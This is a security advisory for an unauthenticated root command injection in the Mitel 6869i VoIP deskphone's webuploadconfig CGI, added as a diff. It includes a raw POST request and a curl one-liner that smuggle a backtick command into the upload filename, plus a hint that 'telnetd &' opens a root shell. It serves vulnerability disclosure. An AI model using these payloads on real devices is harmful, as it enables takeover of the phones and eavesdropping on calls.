@@ -1,0 +1,84 @@
+id: 33096
+date: 08/11/2019
+title: Mitel 6869i Voip Deskphone 4.2.2032 Command Injection Vulnerability
+author: Axel Rengstorf
+cves: 
+
+Vendor:             Mitel  
+Affected Products:  Mitel 6869i Voip Deskphone Version 4.2.2032 - SIP
+Not Affected:       unknown
+Vulnerability:      Mitel 6869i SIP Deskphone 4.2.2032: Unauthenticated Bash 
+                    Command Injection Vulnerability with Root Priviledges in 
+                    /cgi-bin/webuploadconfig script
+Risk:               High 
+____________________________________________________________________________
+
+Vendor communication:
+  2019/08/08    BlueBox Security releases this advisory
+____________________________________________________________________________
+
+Overview:
+--------
+The Mitel 6869i is a desktop VoIP phone offering telephony features. 
+A webservice running on the TCP Port 49249 is used to administrate the phone's 
+VoIP settings, upgrade the firmware and change security settings.
+
+Description:
+--------
+
+The Webserver on port 49249 of the Mitel 6869i phone is using the "webuploadconfig" cgi-script, 
+an arm linux elf executable file, to upload ring tone audio files to the 
+phone with the page=upload_ringtone parameter. 
+The execution of this cgi-script does not require prior authentication.
+Futhermore the script is vulnerable to Bash Command Injection.
+The filename value of the POST request is used unsanitized in a system() call.
+
+The vulnerable POST request to the webuploadconfig-script is the following:
+
+POST //cgi-bin/webuploadconfig?page=upload_ringtone&action=submit&section=0&conn=1 HTTP/1.1
+Host: 192.168.178.147:49249
+User-Agent: curl/7.65.1
+Accept: */*
+Content-Length: 185
+Content-Type: multipart/form-data; boundary=------------------------2754e6a90f270263
+Connection: close
+
+--------------------------2754e6a90f270263
+Content-Disposition: form-data; name="file"; filename="`ping -c 1 192.168.178.140`"
+
+pwned
+--------------------------2754e6a90f270263--
+
+
+By inserting "|command", "`command`" or "$(command) as the value of the "filename" parameter
+the "command" is executed on the underlying linux operating system.
+
+The following linux bash commandline exploits this vulnerability and executes the
+command "ping -c 1 192.168.178.140" on the Mitel 6869i phone with the IP Adress 
+192.168.178.147 with root priviledges:
+
+$ echo "pwned" | curl -F "file=@-;filename=\`ping -c 1 192.168.178.140\`" \
+"http://192.168.178.147:49249//cgi-bin/webuploadconfig?page=upload_ringtone&action=submit&section=0&conn=1"
+
+To verify the successfull completion of the ping-command on the Mitel 6869i 
+phone, start tcpdump on the host system and listen for incoming icmp requests.
+(eg by running tcpdump -i eth0 -n icmp)
+
+The "webuploadconfig" cgi-script also runs with superuser root-priviledges as 
+the telnetd service can be started on the restricted TCP-port 23 by replacing
+the ping-command with "telnetd &".
+
+Impact:
+--------
+The described problems allow an unauthenticated attacker to run arbitary linux
+operating system commands with root-priledges. This leads to a complete comprimise
+of the Mitel 6869i phone and therefore also the possibility to eavesdrop on the
+victim's calls.
+
+Solution
+--------
+We recommend to properly perform input parsing of the filename parameter to avoid
+Command Injection vulnerabilities.
+As a quick fix blocking access to the port 49249 is advisable.
+
+#  0day.today [2023-03-25]  #
